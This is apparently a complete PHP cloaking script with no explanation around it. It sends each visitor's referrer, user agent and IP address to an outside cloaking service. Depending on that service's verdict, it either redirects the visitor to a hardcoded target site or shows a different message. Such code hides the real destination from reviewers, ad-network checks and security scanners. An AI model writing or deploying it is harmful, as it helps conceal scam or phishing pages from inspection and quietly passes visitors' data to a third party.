<?php
ob_start();
$target = "http://sanalnumaram.com";
$key = "12C23C25F68C6";

function url_get_contents ($Url,$key) {
    if (!function_exists('curl_init')){ 
        die('CURL is not installed!');
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
        'key'=>$key,
        'ref' => $_SERVER['HTTP_REFERER'],
        'useragent'=>$_SERVER['HTTP_USER_AGENT'],
        'ip'=>getIpAddress()
    )));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
function getIpAddress()
{
    if (getenv("HTTP_CLIENT_IP")) {
        $ip = getenv("HTTP_CLIENT_IP");
    } else {
        if (getenv("HTTP_X_FORWARDED_FOR")) {
            $ip = getenv("HTTP_X_FORWARDED_FOR");
            if (strstr($ip, ",")) {
                $tmp = explode(",", $ip);
                $ip = trim($tmp[0]);
            }
        } else {
            $ip = getenv("REMOTE_ADDR");
        }
    }
    return $ip;
}
$data = url_get_contents("https://cloaker.shop",$key);
$json = json_decode($data,true);

if($json['status'] == 1){
    header("Location: ".$target);
}else{
    echo $json['message'];
}
ob_end_flush();
?>
